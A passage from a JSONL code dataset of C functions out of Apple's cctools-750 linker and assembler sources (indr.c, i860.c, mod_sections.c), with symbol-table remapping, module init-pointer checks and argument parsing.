N_TYPE) == N_UNDF ||\n\t        (symbols[i].n_type & N_TYPE) == N_PBUD)){\n\t\tundef_map[inew_undefsyms].symbol = symbols[i];\n\t\tif(symbols[i].n_un.n_strx != 0){\n\t\t    sp = lookup_symbol(strings + symbols[i].n_un.n_strx);\n\t\t    if(sp != NULL)\n\t\t\tstrcpy(p, sp->indr);\n\t\t    else\n\t\t\tstrcpy(p, strings + symbols[i].n_un.n_strx);\n\t\t    undef_map[inew_undefsyms].symbol.n_un.n_strx =\n\t\t\tp - new_strings;\n\t\t    p += strlen(p) + 1;\n\t\t}\n\t\tundef_map[inew_undefsyms].old_symbol = TRUE;\n\t\tundef_map[inew_undefsyms].index = i;\n\t\tinew_undefsyms++;\n\t    }\n\t}\n\t/* Sort the undefined symbols by name */\n\tqsort_strings = new_strings;\n\tqsort(undef_map, new_nundefsym, sizeof(struct undef_map),\n\t      (int (*)(const void *, const void *))cmp_qsort_undef_map);\n\t/* Copy the symbols now in sorted order into new_symbols */\n\tfor(i = 0; i < new_nundefsym; i++){\n\t    new_symbols[inew_syms] = undef_map[i].symbol;\n\t    /* update the map for these symbols */\n\t    if(undef_map[i].old_symbol == TRUE)\n\t\tmap[undef_map[i].index] = inew_syms;\n\t     else\n\t\tindr_list.list[undef_map[i].index]->index = inew_syms;\n\t    inew_syms++;\n\t}\n\n\t/*\n\t * Fill in the new module table.  First copy in the old table, and\n\t * module names.  Then add the new module table entries for the\n\t * indr modules.\n\t */\n\tnew_mods = (struct dylib_module *)allocate(\n\t\t\t\tnew_nmodtab * sizeof(struct dylib_module));\n\tinew_mods = 0;\n\tfor(i = 0; i < nmodtab; i++){\n\t    new_mods[inew_mods] = mods[i];\n\t    strcpy(p, strings + mods[i].module_name);\n\t    new_mods[inew_mods].module_name = p - new_strings;\n\t    p += strlen(p) + 1;\n\t    inew_mods++;\n\t}\n\tfor(i = 0; i < indr_list.used; i++){\n\t    memset(new_mods + inew_mods, '\\0', sizeof(struct dylib_module));\n\t    strcpy(p, indr_list.list[i]->membername);\n\t    new_mods[inew_mods].module_name = p - new_strings;\n\t    p += strlen(p) + 1;\n\t    new_mods[inew_mods].iextdefsym = indr_iextdefsym + i;\n\t    new_mods[inew_mods].nextdefsym = 1;\n\t    new_mods[inew_mods].irefsym = nextrefsyms + i * 2;\n\t    new_mods[inew_mods].nrefsym = 2;\n\t    inew_mods++;\n\t}\n\n\t/*\n\t * Fill in the new reference table.  First copy in the old table.  Then\n\t * create entries for the indr modules.\n\t */\n\tnew_refs = (struct dylib_reference *)allocate(\n\t\t\tnew_nextrefsyms * sizeof(struct dylib_reference));\n\tfor(i = 0; i < nextrefsyms; i++){\n\t    new_refs[i].isym = map[refs[i].isym];\n\t    new_refs[i].flags = refs[i].flags;\n\t}\n\tfor(i = 0; i < indr_list.used; i++){\n\t    new_refs[nextrefsyms + i*2].isym = indr_iextdefsym + i;\n\t    new_refs[nextrefsyms + i*2].flags = REFERENCE_FLAG_DEFINED;\n\n\t    if(indr_list.list[i]->existing_symbol == TRUE)\n\t\tnew_refs[nextrefsyms + i*2 + 1].isym = \n\t\t    map[indr_list.list[i]->index];\n\t    else\n\t\tnew_refs[nextrefsyms + i*2 + 1].isym = \n\t\t    indr_list.list[i]->index;\n\t    new_refs[nextrefsyms + i*2 + 1].flags =\n\t\t\t\t\t    REFERENCE_FLAG_UNDEFINED_NON_LAZY;\n\t}\n\n\t/*\n\t * Fill in the new table of contents.  First copy in the old table.\n\t * Then create entries for the indr symbols.\n\t */\n\tnew_tocs = (struct dylib_table_of_contents *)allocate(\n\t\t\t    new_ntoc * sizeof(struct dylib_table_of_contents));\n\tfor(i = 0; i < ntoc; i++){\n\t    new_tocs[i].symbol_index = map[tocs[i].symbol_index];\n\t    new_tocs[i].module_index = tocs[i].module_index;\n\t}\n\tfor(i = 0; i < indr_list.used; i++){\n\t    new_tocs[ntoc + i].symbol_index = indr_iextdefsym + i;\n\t    new_tocs[ntoc + i].module_index = nmodtab + i;\n\t}\n\tqsort_strings = new_strings;\n\tqsort_symbols = new_symbols;\n\tqsort(new_tocs, new_ntoc, sizeof(struct dylib_table_of_contents),\n\t      (int (*)(const void *, const void *))cmp_qsort_toc);\n\n\t/*\n\t * Remap indexes into symbol table in the external relocation entries.\n\t */\n\tfor(i = 0; i < object->dyst->nextrel; i++){\n\t    if((ext_relocs[i].r_address & R_SCATTERED) == 0 &&\n\t       ext_relocs[i].r_extern == 1){\n\t\tif(ext_relocs[i].r_symbolnum > nsyms){\n\t\t    fatal_arch(arch, NULL, \"bad r_symbolnum for external \"\n\t\t\t\"relocation entry %d in: \", i);\n\t\t}\n\t\text_relocs[i].r_symbolnum = map[ext_relocs[i].r_symbolnum];\n\t    }\n\t    else{\n\t\tfatal_arch(arch, NULL, \"bad external relocation entry \"\n\t\t    \"%d (not external) in: \", i);\n\t    }\n\t    if((ext_relocs[i].r_address & R_SCATTERED) == 0){\n\t\tif(reloc_has_pair(object->mh_cputype, ext_relocs[i].r_type))\n\t\t    i++;\n\t    }\n\t    else{\n\t\tsreloc = (struct scattered_relocation_info *)ext_relocs + i;\n\t\tif(reloc_has_pair(object->mh_cputype, sreloc->r_type))\n\t\t    i++;\n\t    }\n\t}\n\n\t/*\n\t * Remap indexes into symbol table in the indirect symbol table.\n\t */\n\tfor(i = 0; i < object->dyst->nindirectsyms; i++){\n\t    if(indirect_symtab[i] != INDIRECT_SYMBOL_LOCAL &&\n\t       indirect_symtab[i] != INDIRECT_SYMBOL_ABS){\n\t\tif(indirect_symtab[i] > nsyms)\n\t\t    fatal_arch(arch, NULL, \"indirect symbol table entry %d \"\n\t\t\t\"(past the end of the symbol table) in: \", i);\n\t\tindirect_symtab[i] = map[indirect_symtab[i]];\n\t    }\n\t}\n\n\t/*\n\t * Now that all the new tables have been built and existing table\n\t * updated set the object struct to use them.\n\t */\n\tobject->input_sym_info_size =\n\t    object->dyst->nlocrel * sizeof(struct relocation_info) +\n\t    object->dyst->nextrel * sizeof(struct relocation_info) +\n\t    object->dyst->nindirectsyms * sizeof(uint32_t) +\n\t    nsyms * sizeof(struct nlist) +\n\t    strsize +\n\t    ntoc * sizeof(struct dylib_table_of_contents)+\n\t    nmodtab * sizeof(struct dylib_module) +\n\t    nextrefsyms * sizeof(struct dylib_reference);\n\n\tobject->output_sym_info_size =\n\t    object->dyst->nlocrel * sizeof(struct relocation_info) +\n\t    object->dyst->nextrel * sizeof(struct relocation_info) +\n\t    object->dyst->nindirectsyms * sizeof(uint32_t) +\n\t    new_nsyms * sizeof(struct nlist) +\n\t    new_strsize +\n\t    new_ntoc * sizeof(struct dylib_table_of_contents)+\n\t    new_nmodtab * sizeof(struct dylib_module) +\n\t    new_nextrefsyms * sizeof(struct dylib_reference);\n\n\tif(object->split_info_cmd != NULL){\n\t    object->input_sym_info_size += object->split_info_cmd->datasize;\n\t    object->output_sym_info_size += object->split_info_cmd->datasize;\n\t}\n\n\tif(object->hints_cmd != NULL){ \n\t    object->input_sym_info_size +=\n\t\tobject->hints_cmd->nhints * sizeof(struct twolevel_hint);\n\t    object->output_sym_info_size +=\n\t\tobject->hints_cmd->nhints * sizeof(struct twolevel_hint);\n\t}\n\n\tif(object->code_sig_cmd != NULL){\n\t    object->input_sym_info_size =\n\t\tround(object->input_sym_info_size, 16);\n\t    object->input_sym_info_size +=\n\t\tobject->code_sig_cmd->datasize;\n\t    object->output_sym_info_size =\n\t\tround(object->output_sym_info_size, 16);\n\t    object->output_sym_info_size +=\n\t\tobject->code_sig_cmd->datasize;\n\t}\n\n\tif(object->seg_linkedit != NULL){\n\t    object->seg_linkedit->filesize += object->output_sym_info_size -\n\t\t\t\t\t      object->input_sym_info_size;\n\t    object->seg_linkedit->vmsize = object->seg_linkedit->filesize;\n\t}\n\n\tobject->output_symbols = new_symbols;\n\tobject->output_nsymbols = new_nsyms;\n\tobject->output_strings = new_strings;\n\tobject->output_strings_size = new_strsize;\n\tobject->output_tocs = new_tocs;\n\tobject->output_ntoc = new_ntoc;\n\tobject->output_mods = new_mods;\n\tobject->output_nmodtab = new_nmodtab;\n\tobject->output_refs = new_refs;\n\tobject->output_nextrefsyms = new_nextrefsyms;\n\tobject->output_loc_relocs = (struct relocation_info *)\n\t    (object->object_addr + object->dyst->locreloff);\n\tif(object->split_info_cmd != NULL){\n\t    object->output_split_info_data = \n\t    (object->object_addr + object->split_info_cmd->dataoff);\n\t    object->output_split_info_data_size = \n\t\tobject->split_info_cmd->datasize;\n\t}\n\tobject->output_ext_relocs = ext_relocs;\n\tobject->output_indirect_symtab = indirect_symtab;\n\tif(object->hints_cmd != NULL){\n\t    object->output_hints = (struct twolevel_hint *)\n\t\t(object->object_addr + object->hints_cmd->offset);\n\t}\n\tif(object->code_sig_cmd != NULL){\n\t    object->output_code_sig_data = object->object_addr +\n\t\tobject->code_sig_cmd->dataoff;\n\t    object->output_code_sig_data_size = \n\t\tobject->code_sig_cmd->datasize;\n\t}\n\n\tif(object->object_byte_sex != host_byte_sex){\n\t    /* the symbol table gets swapped by writeout() */\n\t    swap_dylib_table_of_contents(new_tocs, new_ntoc,\n\t\tobject->object_byte_sex);\n\t    swap_dylib_module(new_mods, new_nmodtab,\n\t\tobject->object_byte_sex);\n\t    swap_dylib_reference(new_refs, new_nextrefsyms,\n\t\tobject->object_byte_sex);\n\t    swap_relocation_info(ext_relocs, object->dyst->nextrel,\n\t\tobject->object_byte_sex);\n\t    swap_indirect_symbols(indirect_symtab, object->dyst->nindirectsyms,\n\t\tobject->object_byte_sex);\n\t}\n\n\tobject->st->nsyms = new_nsyms; \n\tobject->st->strsize = new_strsize;\n\n\tobject->dyst->ilocalsym = 0;\n\tobject->dyst->nlocalsym = new_nlocalsym;\n\tobject->dyst->iextdefsym = new_nlocalsym;\n\tobject->dyst->nextdefsym = new_nextdefsym;\n\tobject->dyst->iundefsym = new_nlocalsym + new_nextdefsym;\n\tobject->dyst->nundefsym = new_nundefsym;\n\tobject->dyst->ntoc = new_ntoc;\n\tobject->dyst->nmodtab = new_nmodtab;\n\tobject->dyst->nextrefsyms = new_nextrefsyms;\n\n\toffset = object->seg_linkedit->fileoff;\n\tif(object->dyst->nlocrel != 0){\n\t    object->dyst->locreloff = offset;\n\t    offset += object->dyst->nlocrel * sizeof(struct relocation_info);\n\t}\n\tif(object->split_info_cmd != NULL){\n\t    object->split_info_cmd->dataoff = offset;\n\t    offset += object->split_info_cmd->datasize;\n\t}\n\tif(object->st->nsyms != 0){\n\t    object->st->symoff = offset;\n\t    offset += object->st->nsyms * sizeof(struct nlist);\n\t}\n\tif(object->hints_cmd != NULL){\n\t    if(object->hints_cmd->nhints != 0){\n\t\tobject->hints_cmd->offset = offset;\n\t\toffset += object->hints_cmd->nhints *\n\t\t\t  sizeof(struct twolevel_hint);\n\t    }\n\t}\n\tif(object->dyst->nextrel != 0){\n\t    object->dyst->extreloff = offset;\n\t    offset += object->dyst->nextrel * sizeof(struct relocation_info);\n\t}\n\tif(object->dyst->nindirectsyms != 0){\n\t    object->dyst->indirectsymoff = offset;\n\t    offset += object->dyst->nindirectsyms * sizeof(uint32_t);\n\t}\n\tif(object->dyst->ntoc != 0){\n\t    object->dyst->tocoff = offset;\n\t    offset += object->dyst->ntoc *\n\t\t      sizeof(struct dylib_table_of_contents);\n\t}\n\tif(object->dyst->nmodtab != 0){\n\t    object->dyst->modtaboff = offset;\n\t    offset += object->dyst->nmodtab * sizeof(struct dylib_module);\n\t}\n\tif(object->dyst->nextrefsyms != 0){\n\t    object->dyst->extrefsymoff = offset;\n\t    offset += object->dyst->nextrefsyms *\n\t\t      sizeof(struct dylib_reference);\n\t}\n\tif(object->st->strsize != 0){\n\t    object->st->stroff = offset;\n\t    offset += object->st->strsize;\n\t}\n\tif(object->code_sig_cmd != NULL){\n\t    offset = round(offset, 16);\n\t    object->code_sig_cmd->dataoff = offset;\n\t    offset += object->code_sig_cmd->datasize;\n\t}\n}", "path": "cctools-750\\misc\\indr.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/* should never be called for i860 */\n", "func_signal": "int\nmd_estimate_size_before_relax(\nfragS *fragP,\nint nsect)", "code": "{\n    fprintf(stderr, \"i860_estimate_size_before_relax\\n\");\n    abort();\n    return 0;\n}", "path": "cctools-750\\as\\i860.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/*\n * mod_section_merge() is used to check the section looks ok for a module\n * initialization or termination function pointer section.  After this the rest\n * of the link editor treats it like a regular section in how it's relocated and\n * output.  When redo_live is TRUE it re-merges only the live pointers based on\n * the live bit in the previouly allocated fine_relocs.\n */\n", "func_signal": "__private_extern__\nvoid\nmod_section_merge(\nstruct mod_term_data *data,\nstruct merged_section *ms,\nstruct section *s, \nstruct section_map *section_map,\nenum bool redo_live)", "code": "{\n    unsigned long i, npointers, nlive_pointers;\n    struct relocation_info *relocs, reloc;\n    struct scattered_relocation_info *sreloc;\n    unsigned long r_address, r_pcrel, r_length, r_type;\n    char *type_name;\n    struct fine_reloc *fine_relocs;\n#ifdef __MWERKS__\n    void *dummy;\n        dummy = data;\n#endif\n\tif((ms->s.flags & SECTION_TYPE) == S_MOD_INIT_FUNC_POINTERS)\n\t    type_name = \"initialization\";\n\telse\n\t    type_name = \"termination\";\n\n\t/*\n\t * Module initialization and termination function pointer sections must\n\t * contain only pointers to functions.  Each of these pointers should be\n\t * 4 bytes and have a relocation entry.  A good number of checks are\n\t * done here to make sure that things are ok but it is not exaustive.\n\t * There could be multiple relocation entries for the same address and\n\t * there is no check for what the relocation entry points at (a check\n\t * could be done to see that it points to a section with the attribute\n\t * S_ATTR_PURE_INSTRUCTIONS).\n\t */\n\tif(s->size % 4 != 0){\n\t    error_with_cur_obj(\"module %s function pointer section (%.16s,\"\n\t\t\"%.16s) size is not a multiple of 4 bytes\", type_name,\n\t\ts->segname, s->sectname);\n\t    return;\n\t}\n\tif(s->nreloc != s->size / 4){\n\t    error_with_cur_obj(\"module %s function pointer section (%.16s,\"\n\t\t\"%.16s) does not have is exactly one relocation entry for each \"\n\t\t\"pointer\\n\", type_name, s->segname, s->sectname);\n\t    return;\n\t}\n\trelocs = (struct relocation_info *)(cur_obj->obj_addr + s->reloff);\n\tfor(i = 0; i < s->nreloc; i++){\n\t    reloc = relocs[i];\n\t    if(cur_obj->swapped &&\n\t       section_map->input_relocs_already_swapped == FALSE)\n\t\tswap_relocation_info(&reloc, 1, host_byte_sex);\n\t    /*\n\t     * Break out the fields of the relocation entry we need here.\n\t     */\n\t    if((reloc.r_address & R_SCATTERED) != 0){\n\t\tsreloc = (struct scattered_relocation_info *)(&reloc);\n\t\tr_address = sreloc->r_address;\n\t\tr_pcrel = sreloc->r_pcrel;\n\t\tr_length = sreloc->r_length;\n\t\tr_type = sreloc->r_type;\n\t    }\n\t    else{\n\t\tr_address = reloc.r_address;\n\t\tr_pcrel = reloc.r_pcrel;\n\t\tr_length = reloc.r_length;\n\t\tr_type = reloc.r_type;\n\t    }\n\t    /*\n\t     * For a module initialization and termination function pointer\n\t     * sections all relocation entries must be for one of the pointers\n\t     * and therefore the offset must be a multiple of 4, have an\n\t     * r_length field of 2 (long), a r_pcrel field of 0 (FALSE) and a\n\t     * r_type of 0 (VANILLA).\n\t     */\n\t    if(r_address % 4 != 0){\n\t\terror_with_cur_obj(\"r_address (0x%x) field of relocation entry \"\n\t\t    \"%ld in module %s function pointer section (%.16s,%.16s) \"\n\t\t    \"is not a multiple of 4\", (unsigned int)r_address, i,\n\t\t    type_name, s->segname, s->sectname);\n\t\tcontinue;\n\t    }\n\t    if(r_length != 2){\n\t\terror_with_cur_obj(\"r_length (0x%x) field of relocation entry \"\n\t\t    \"%ld in module %s function pointer section (%.16s,%.16s) \"\n\t\t    \"is not 2 (long)\", (unsigned int)r_length, i, type_name,\n\t\t    s->segname, s->sectname);\n\t\tcontinue;\n\t    }\n\t    if(r_pcrel != 0){\n\t\terror_with_cur_obj(\"r_pcrel (0x%x) field of relocation entry \"\n\t\t    \"%ld in module %s function pointer section (%.16s,%.16s) \"\n\t\t    \"is not 0 (FALSE)\", (unsigned int)r_pcrel, i, type_name,\n\t\t    s->segname, s->sectname);\n\t\tcontinue;\n\t    }\n\t    if(r_type != 0){\n\t\terror_with_cur_obj(\"r_type (0x%x) field of relocation entry \"\n\t\t    \"%ld in module %s function pointer section (%.16s,%.16s) \"\n\t\t    \"is not 0 (VANILLA)\", (unsigned int)r_type, i, type_name,\n\t\t    s->segname, s->sectname);\n\t\tcontinue;\n\t    }\n\t}\n\n#ifndef RLD\n\t/*\n\t * For MH_DYLIB formats make sure there is only one module\n\t * initialization and termination function pointer section and record\n\t * the index into the output section and the number of enties for this\n\t * object.\n\t */\n\tif(filetype == MH_DYLIB){\n\t    if((ms->s.flags & SECTION_TYPE) == S_MOD_INIT_FUNC_POINTERS){\n\t\tif(dylib_ms_init != NULL && dylib_ms_init != ms)\n\t\t    error(\"multiple module initialization function pointer \"\n\t\t\t  \"sections (%.16s,%.16s) and (%.16s,%.16s) only one \"\n\t\t\t  \"allowed in MH_DYLIB output\", s->segname, s->sectname,\n\t\t\t  dylib_ms_init->s.segname, dylib_ms_init->s.sectname);\n\t\tdylib_ms_init = ms;\n\t\tcur_obj->ninit = s->size / 4;\n\t\tcur_obj->iinit = ninit;\n\t\tninit += cur_obj->ninit;\n\t\tif(ninit > 0xffff)\n\t\t    error(\"too many module initialization function pointer in \"\n\t\t\t  \"section (%.16s,%.16s) in MH_DYLIB output (maximum \"\n\t\t\t  \"is %d)\", s->segname, s->sectname, 0xffff);\n\t    }\n\t    else{\n\t\tif(dylib_ms_term != NULL && dylib_ms_term != ms)\n\t\t    error(\"multiple module termination function pointer \"\n\t\t\t  \"sections (%.16s,%.16s) and (%.16s,%.16s) only one \"\n\t\t\t  \"allowed in MH_DYLIB output\", s->segname, s->sectname,\n\t\t\t  dylib_ms_term->s.segname, dylib_ms_term->s.sectname);\n\t\tdylib_ms_term = ms;\n\t\tcur_obj->nterm = s->size / 4;\n\t\tcur_obj->iterm = nterm;\n\t\tnterm += cur_obj->nterm;\n\t\tif(nterm > 0xffff)\n\t\t    error(\"too many module termination function pointer in \"\n\t\t\t  \"section (%.16s,%.16s) in MH_DYLIB output (maximum \"\n\t\t\t  \"is %d)\", s->segname, s->sectname, 0xffff);\n\t    }\n\t}\n#endif /* !defined(RLD) */\n\n\t/*\n\t * Check to see if the alignment will not leave zero pointers.\n\t */\n\tif(s->align > 2)\n\t    warning_with_cur_obj(\"aligment greater than 2 (2^2, 4 bytes) for \"\n\t\t\"module %s function pointer section (%.16s,%.16s) (will leave \"\n\t\t\"holes with zeroes for pointers)\", type_name, s->segname,\n\t\ts->sectname);\n\n\t/*\n\t * Now that every thing looks ok do what would have been done in\n\t * merge_sections() for regular sections.\n\t */\n\tsection_map->flush_offset = ms->s.size;\n\tif(redo_live == FALSE){\n\t    ms->s.size = round(ms->s.size, 1 << s->align);\n\t    section_map->offset = ms->s.size;\n\t    ms->s.size   += s->size;\n\t    ms->s.nreloc += s->nreloc;\n\t    nreloc += s->nreloc;\n\t}\n\n\t/*\n\t * If we are doing dead stripping create a fine relocation structure\n\t * for each pointer.\n\t */\n\tif(dead_strip == TRUE){\n\t    if(redo_live == FALSE){\n\t\tnpointers = s->size / 4;\n\t\tfine_relocs = allocate(npointers * sizeof(struct fine_reloc));\n\t\tmemset(fine_relocs, '\\0',npointers * sizeof(struct fine_reloc));\n\n\t\t/*\n\t\t * Create a fine relocation structure for each pointer in the \n\t\t * section and record the offsets in the input file and map it\n\t\t * to the next offset in the output file.  The fine reloc will\n\t\t * later be marked live if needed.\n\t\t */\n\t\tfor(i = 0; i < npointers; i++){\n\t\t    fine_relocs[i].input_offset = i * 4;\n\t\t    fine_relocs[i].output_offset = data->output_offset;\n\t\t    data->output_offset += 4;\n\t\t}\n\t\tsection_map->fine_relocs = fine_relocs;\n\t\tsection_map->nfine_relocs = npointers;\n\t    }\n\t    else{\n\t\t/*\n\t\t * Walk through the relocation structures and reset the\n\t\t * output_offset for each of the live pointers.  Then increment\n\t\t * the size of the section based on the number of live pointers.\n\t\t */\n\t\tfine_relocs = section_map->fine_relocs;\n\t\tnpointers = section_map->nfine_relocs;\n\t\tnlive_pointers = 0;\n\t\tfor(i = 0; i < npointers; i++){\n\t\t    if(fine_relocs[i].live == TRUE){\n/*\nprintf(\"mod init pointer live in %s (%.16s,%.16s) at offset 0x%x\\n\",\ncur_obj->file_name, ms->s.segname, ms->s.sectname, (unsigned int)r_address);\n*/\n\t\t\tfine_relocs[i].output_offset = data->output_offset;\n\t\t\tdata->output_offset += 4;\n\t\t\tnlive_pointers++;\n\t\t    }\n\t\t    else{\n/*\nprintf(\"mod init pointer dead in %s (%.16s,%.16s) at offset 0x%x\\n\",\ncur_obj->file_name, ms->s.segname, ms->s.sectname, (unsigned int)r_address);\n*/\n\t\t\tfine_relocs[i].output_offset = 0;\n\t\t    }\n\t\t}\n\t\tif(nlive_pointers != 0){\n\t\t    ms->s.size = round(ms->s.size, 1 << s->align);\n\t\t    section_map->offset = ms->s.size;\n\t\t    ms->s.size   += nlive_pointers * 4;\n\t\t    ms->s.nreloc += s->nreloc;\n\t\t    nreloc += s->nreloc;\n\t\t}\n\t    }\n\t}\n}", "path": "cctools-750\\ld\\mod_sections.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/*\n * mod_section_reset_live() is called when -dead_strip is specified after\n * the initialization or termination function pointer sections the input\n * objects are merged.  It clears out the output_offset so the live pointers\n * can be re-merged (by later calling mod_section_merge() with redo_live ==\n * TRUE.\n */\n", "func_signal": "__private_extern__\nvoid\nmod_section_reset_live(\nstruct mod_term_data *data, \nstruct merged_section *ms)", "code": "{\n#ifndef RLD\n\t/* reset the merge section size back to zero */\n\tms->s.size = 0;\n\n\t/* reset the counts of the number of inits and terms back to zero */\n\tninit = 0;\n\tnterm = 0;\n\n\t/* reset the count of relocation entries for this merged section */\n\tnreloc -= ms->s.nreloc;\n\tms->s.nreloc = 0;\n\n\t/* clear the current value of output_offset */\n\tdata->output_offset = 0;\n#endif /* !defined(RLD) */\n}", "path": "cctools-750\\ld\\mod_sections.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/*\n * Like as_warn_where but the file name and optional line number and column\n * are passed in.\n */\n", "func_signal": "void\nas_warn_where_with_column (char *file, unsigned int line, unsigned int column, const char *format, ...)", "code": "{\n  va_list args;\n\n  if (!flagseen['W'])\n    {\n\t    print_architecture_banner();\n\t    fprintf(stderr, \"%s:\", file);\n\t    if (line)\n\t      {\n\t\tfprintf(stderr, \"%u:\", line);\n\t\tif (column)\n\t\t    fprintf(stderr, \"%u:\", column);\n\t      }\n\t    va_start (args, format);\n\t    vfprintf(stderr, format, args);\n\t    fprintf(stderr, \"\\n\");\n\t    va_end (args);\n    }\n}", "path": "cctools-750\\as\\messages.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/*\n * This routine is called after all calls to add_to_string_table() are made\n * to round off the size of the string table.  It zeros the rounded bytes.\n */\n", "func_signal": "static\nvoid\nend_string_table()", "code": "{\n    uint32_t length;\n\n\tlength = round(string_table.index, sizeof(uint32_t));\n\tmemset(string_table.strings + string_table.index, '\\0',\n\t       length - string_table.index);\n\tstring_table.index = length;\n}", "path": "cctools-750\\misc\\indr.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/*\n * Write out little-endian.  Valid for instructions only in\n * our i860 implementation.\n */\n", "func_signal": "static\nvoid\nmd_insn_to_chars(\nunsigned char *buf,\nint32_t val,\nint n)", "code": "{\n\n    switch(n) {\n\n    case 4:\n\t*buf++ = val;\n\t*buf++ = val >> 8;\n\t*buf++ = val >> 16;\n\t*buf++ = val >> 24;\n\tbreak;\n    case 2:\n\t*buf++ = val;\n\t*buf++ = val >> 8;\n\tbreak;\n    case 1:\n\t*buf = val;\n\tbreak;\n\n    default:\n\tabort();\n    }\n    return;\n}", "path": "cctools-750\\as\\i860.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/* for debugging only */\n", "func_signal": "static void\nprint_insn(\nstruct i860_it *insn)", "code": "{\n    char *Reloc[] = {\n    \"RELOC_8\",\n    \"RELOC_16\",\n    \"RELOC_32\",\n    \"RELOC_DISP8\",\n    \"RELOC_DISP16\",\n    \"RELOC_DISP32\",\n    \"RELOC_WDISP30\",\n    \"RELOC_WDISP22\",\n    \"RELOC_HI22\",\n    \"RELOC_22\",\n    \"RELOC_13\",\n    \"RELOC_LO10\",\n    \"RELOC_SFA_BASE\",\n    \"RELOC_SFA_OFF13\",\n    \"RELOC_BASE10\",\n    \"RELOC_BASE13\",\n    \"RELOC_BASE22\",\n    \"RELOC_PC10\",\n    \"RELOC_PC22\",\n    \"RELOC_JMP_TBL\",\n    \"RELOC_SEGOFF16\",\n    \"RELOC_GLOB_DAT\",\n    \"RELOC_JMP_SLOT\",\n    \"RELOC_RELATIVE\",\n    \"NO_RELOC\"\n    };\n\n    if (insn->error) {\n\tfprintf(stderr, \"ERROR: %s\\n\");\n    }\n    fprintf(stderr, \"opcode=0x%08x\\n\", insn->opcode);\n    fprintf(stderr, \"reloc = %s\\n\", Reloc[insn->reloc]);\n    fprintf(stderr, \"exp =  {\\n\");\n    fprintf(stderr, \"\\t\\tX_add_symbol = %s\\n\",\n\tinsn->exp.X_add_symbol ?\n\t(insn->exp.X_add_symbol->sy_name ? \n\tinsn->exp.X_add_symbol->sy_name : \"???\") : \"0\");\n    fprintf(stderr, \"\\t\\tX_sub_symbol = %s\\n\",\n\tinsn->exp.X_subtract_symbol ?\n\t    (insn->exp.X_subtract_symbol->sy_name ? \n\t        insn->exp.X_subtract_symbol->sy_name : \"???\") : \"0\");\n    fprintf(stderr, \"\\t\\tX_add_number = %d\\n\",\n\tinsn->exp.X_add_number);\n    fprintf(stderr, \"}\\n\");\n    return;\n}", "path": "cctools-750\\as\\i860.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/*\n * Function for qsort for comparing undefined map entries.\n */\n", "func_signal": "static\nint\ncmp_qsort_undef_map(\nconst struct undef_map *sym1,\nconst struct undef_map *sym2)", "code": "{\n\treturn(strcmp(qsort_strings + sym1->symbol.n_un.n_strx,\n\t\t      qsort_strings + sym2->symbol.n_un.n_strx));\n}", "path": "cctools-750\\misc\\indr.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/* should never be called for i860 */\n", "func_signal": "void\nmd_convert_frag(\nfragS *fragP)", "code": "{\n    fprintf(stderr, \"i860_convert_frag\\n\");\n    abort();\n}", "path": "cctools-750\\as\\i860.c", "repo_name": "rentzsch/MagicHat", "stars": 43, "license": "None", "language": "c", "size": 3423}
{"docstring": "/*\n * The indr(l) program takes the following options:\n *\n *\t% indr [-n] list_filename input_file output_file\n *\n * It builds the output file by translating each symbol name listed in\n * list file to the same name with and underbar prepended to it in all the\n * objects in the input file.  Then it if the input file is an archive and the\n * -n flag is not specified then it creates an object for each of these\n * symbols with an indirect symbol for the symbol name with an underbar and\n * adds that to the output archive.\n *\n * The -n flag is to suppress creating the indirect objects.\n */\n", "func_signal": "int\nmain(\nint argc,\nchar *argv[],\nchar *envp[])", "code": "{\n    int i;\n    uint32_t j;\n    enum bool no_flags_left;\n    char *list_filename, *output_file, *input_file;\n    struct arch_flag *arch_flags;\n    uint32_t narch_flags;\n    enum bool all_archs;\n    enum bool nflag;\n    struct arch *archs;\n    uint32_t narchs;\n    struct stat stat_buf;\n\n\tprogname = argv[0];\n\n\tarch_flags = NULL;\n\tnarch_flags = 0;\n\tall_archs = FALSE;\n\n\tarchs = NULL;\n\tnarchs = 0;\n\n\tlist_filenames = NULL;\n\tlist_filename = NULL;\n\tinput_file = NULL;\n\toutput_file = NULL;\n\tnflag = FALSE;\n\n\t/*\n\t * Parse the flags.\n\t */\n\tno_flags_left = FALSE;\n\tfor(i = 1; i < argc ; i++){\n\t    if(argv[i][0] != '-' || no_flags_left){\n\t\tif(list_filename == NULL && list_filenames == NULL)\n\t\t    list_filename = argv[i];\n\t\telse if(input_file == NULL)\n\t\t    input_file = argv[i];\n\t\telse if(output_file == NULL)\n\t\t    output_file = argv[i];\n\t\telse\n\t\t    usage();\n\t\tcontinue;\n\t    }\n\t    if(argv[i][1] == '\\0'){\n\t\tno_flags_left = TRUE;\n\t\tcontinue;\n\t    }\n\t    if(strcmp(argv[i], \"-arch\") == 0){\n\t\tif(list_filenames != NULL)\n\t\t    fatal(\"can't mix -arch_indr and -arch arguments\");\n\t\tif(i + 1 >= argc){\n\t\t    error(\"missing argument(s) to %s option\", argv[i]);\n\t\t    usage();\n\t\t}\n\t\tif(strcmp(\"all\", argv[i+1]) == 0){\n\t\t    all_archs = TRUE;\n\t\t}\n\t\telse{\n\t\t    arch_flags = reallocate(arch_flags,\n\t\t\t    (narch_flags + 1) * sizeof(struct arch_flag));\n\t\t    if(get_arch_from_flag(argv[i+1],\n\t\t\t\t\t  arch_flags + narch_flags) == 0){\n\t\t\terror(\"unknown architecture specification flag: \"\n\t\t\t      \"%s %s\", argv[i], argv[i+1]);\n\t\t\tarch_usage();\n\t\t\tusage();\n\t\t    }\n\t\t    for(j = 0; j < narch_flags; j++){\n\t\t\tif(arch_flags[j].cputype ==\n\t\t\t\tarch_flags[narch_flags].cputype 